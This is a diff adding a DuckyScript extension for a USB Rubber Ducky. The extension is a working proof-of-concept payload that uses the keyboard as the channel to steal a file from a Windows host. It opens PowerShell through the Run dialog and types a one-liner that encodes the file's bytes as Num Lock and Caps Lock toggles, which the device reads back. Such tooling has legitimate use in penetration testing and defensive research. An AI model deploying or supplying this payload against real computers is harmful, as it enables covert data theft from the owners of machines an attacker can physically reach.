@@ -1,0 +1,51 @@
+EXTENSION WINDOWS_HID_EXFIL
+    REM VERSION 1.0
+
+    REM Helpers for Keystroke Reflection data exfiltration
+    REM This payload is a proof of concept for USB HID only Data Exfiltration
+
+    REM TARGET:
+    REM Windows Hostthat supports powershell and SendKeys
+
+    REM USAGE:
+    REM Uncomment the function call below to run this extension inline
+    REM or call RUN_EXFIL() anywhere in your payload after the extension
+
+    REM DEPLOYMENT:
+    REM Plug Ducky into host, wait for the LED to turn (and stay) solid Green.
+
+    REM CONFIGURATION:
+    REM File on host machine to exfil using Keystroke Reflection attack
+    DEFINE TARGET_FILE filename.txt
+    FUNCTION RUN_WINDOWS_EXFIL()
+        REM Boot
+        LED_OFF
+        DELAY 500
+        REM Launch Windows RUN dialog
+        GUI r
+        DELAY 50
+        REM Launch powershell
+        STRING powershell
+        ENTER
+        DELAY 250
+        REM Save HOSTs current lock state
+        SAVE_HOST_KEYBOARD_LOCK_STATE
+        REM Start Listening - Enable EXFIL mode, Enable EXFIL mode for Device LEDS
+        $_EXFIL_MODE_ENABLED = TRUE
+        $_EXFIL_LEDS_ENABLED = TRUE
+        REM Convert and reflect target file
+        STRING foreach($b in $(Get-Content "TARGET_FILE" -Encoding byte)){foreach($a in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){If($b -band $a){$o+="%{NUMLOCK}"}Else{$o+="%{CAPSLOCK}"}}};$o+="%{SCROLLLOCK}";Add-Type -Assembly System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait("$o");exit;
+        ENTER
+        REM Listen for EOF
+        WAIT_FOR_SCROLL_CHANGE
+        REM Indicate SUCCESS on Device LED, Disable EXFIL mode
+        LED_G
+        $_EXFIL_MODE_ENABLED = FALSE
+        REM Restore HOSTs lock state to original
+        RESTORE_HOST_KEYBOARD_LOCK_STATE
+    END_FUNCTION
+
+    REM Uncomment the function call below to run this extension inline (here)
+    REM or call RUN_WINDOWS_EXFIL() anywhere in your payload after the extension
+    REM RUN_WINDOWS_EXFIL()
+END_EXTENSION
